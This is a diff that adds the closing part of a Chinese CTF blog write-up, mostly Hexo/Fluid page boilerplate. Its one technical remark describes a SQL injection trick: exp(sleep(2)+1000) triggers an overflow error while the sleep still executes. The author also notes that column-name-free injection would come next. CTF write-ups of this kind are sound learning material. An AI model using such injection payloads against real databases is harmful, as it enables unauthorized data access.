+<p>sleep(2)返回0，exp(sleep(2)+1000)会溢出报错，但sleep(2)仍然会执行</p>
+<p>由于环境关了，没能复现成功，下面应该是无列名注入找flag了，等buu上题复现qwq</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/05/15/minilctf/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">minilctf</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/10/Frp%E4%BD%BF%E7%94%A8/">
+                        <span class="hidden-mobile">Frp使用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
